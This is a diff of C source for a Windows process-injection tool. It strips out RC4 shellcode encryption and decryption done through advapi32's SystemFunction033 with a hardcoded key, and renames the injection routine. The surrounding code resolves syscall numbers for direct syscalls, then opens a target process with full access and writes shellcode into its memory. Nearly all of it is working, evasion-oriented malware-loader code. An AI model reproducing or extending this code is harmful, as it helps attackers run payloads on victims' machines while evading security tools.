@@ -1,58 +1,6 @@
 #include "Box.h"
 
-
-/*--------------------------------------------------------[RC4 Encryption]----------------------------------------------------*/
-
-
-BOOL EncryptRC4(
-	_In_ CONST PBYTE pShellcode,
-	_In_ CONST SIZE_T sSizeofShellcode
-)
-{
-
-	NTSTATUS STATUS = NULL;
-
-	BYTE _key[] = { 0xDE,0xAD,0xBE,0xEF }; // key used to decrypt and encrypt shellcode
-
-	// ensure everything is working
-	if (!pShellcode || sSizeofShellcode == 0) {
-		WARN("EncryptRC4_SystemFunc: invalid params");
-		return FALSE;
-	}
-
-	DATA_BLOB data_blob = { .cbData = (DWORD)sSizeofShellcode, .pbData = pShellcode };
-	DATA_BLOB key_blob = { .cbData = (DWORD)sizeof(_key), .pbData = _key };
-
-	// SystemFunction033 from advapi32
-	_SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibrary(L"advapi32"), "SystemFunction033");
-	if (!SystemFunction033) {
-		WARN("GetProcAddress(SystemFunction033) failed");
-		return FALSE;
-	}
-
-	if ((STATUS = SystemFunction033(&data_blob, &key_blob)) != 0x0)
-	{
-		printf("[!] SystemFunction033 FAILED With Error : 0x%0.8X\n", STATUS);
-		return FALSE;
-	}
-
-
-	for (DWORD i = 0; i < data_blob.cbData; i++)
-	{
-		if (i % 16 == 0) printf("\n ");
-		Sleep(1);
-		printf(" %02x", data_blob.pbData[i]);
-	}
-
-
-
-	printf("\nCurrent RC4 Encrypted Shellcode Address: %p\n", (void*)data_blob.pbData);
-
-	return TRUE;
-}
-
-
-/*-------------------------------------------------------[GetProcAddress ALternative]---------------------------------------------------*/
+/*-------------------------------------------------------[Populate SSN]---------------------------------------------------*/
 
 
 VOID GetSSN(IN HMODULE mod, IN LPCSTR FuncName, OUT DWORD* FuncSSN)
@@ -78,9 +26,8 @@ VOID GetSSN(IN HMODULE mod, IN LPCSTR FuncName, OUT DWORD* FuncSSN)
 /*-----------------------------------------------------[Direct Syscalls]------------------------------------------------------*/
 
 
-BOOL NtShellInjection(
+BOOL DirectShellInjection(
 	_In_ CONST DWORD PID,
-	CONST PBYTE pEncryptedShellcode,
 	_In_ CONST PBYTE pShellcode,
 	_In_ CONST SIZE_T sSizeofShellcode
 )
@@ -122,9 +69,6 @@ BOOL NtShellInjection(
 	GetSSN(NtdllHandle, "NtWaitForSingleObject", &g_NtWaitForSingleObjectSSN);
 	GetSSN(NtdllHandle, "NtFreeVirtualMemory", &g_NtFreeVirtualMemorySSN);
 	GetSSN(NtdllHandle, "NtClose", &g_NtCloseSSN);
-	_SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibrary(L"advapi32"), "SystemFunction033");
-
-
 
 	STATUS = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
 	if (STATUS_SUCCESS != STATUS)
@@ -146,42 +90,11 @@ BOOL NtShellInjection(
 	OKAY("Allocated %zu Bytes to Virtual Memory!", sSizeofShellcode);
 
 
-	/*---------------------------------------------------------------[Decrypting RC4 Shellcode]---------------------------------------------*/
-
-
-	// Used to decrypt Shellcode
-	PUCHAR localBuf = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, sSizeofShellcode);
-	if (!localBuf) {
-		WARN("HeapAlloc failed for localBuf");
-		HeapFree(GetProcessHeap(), 0, localBuf);
-		localBuf = NULL;
-		State = FALSE;
-	}
-	RtlCopyMemory(localBuf, pEncryptedShellcode, sSizeofShellcode);
-
-
-	DATA_BLOB data_local = { .cbData = (DWORD)sSizeofShellcode, .pbData = localBuf };
-
-
-	BYTE local_key_bytes[] = { 0xDE, 0xAD, 0xBE, 0xEF };
-	DATA_BLOB key_local = { .cbData = (DWORD)sizeof(local_key_bytes), .pbData = local_key_bytes };
-
-
-	if ((STATUS = SystemFunction033(&data_local, &key_local)) != 0x0)
-	{
-		printf("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
-		HeapFree(GetProcessHeap(), 0, localBuf);
-		return FALSE;
-	}
-
-	OKAY("Successfully Decrypted RC4!");
-
-
 	/*------------------------------------------------------------------------[Writing Shellcode to Virtual Memory]-----------------------------------------------------------*/
 
 
 	// Write the newly decrypted shellcode inside
-	STATUS = NtWriteVirtualMemory(hProcess, rBuffer, localBuf, origSize, &BytesWritten);
+	STATUS = NtWriteVirtualMemory(hProcess, rBuffer, pShellcode, origSize, &BytesWritten);
 	if (STATUS_SUCCESS != STATUS)
 	{
 		WARN("NtWriteVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
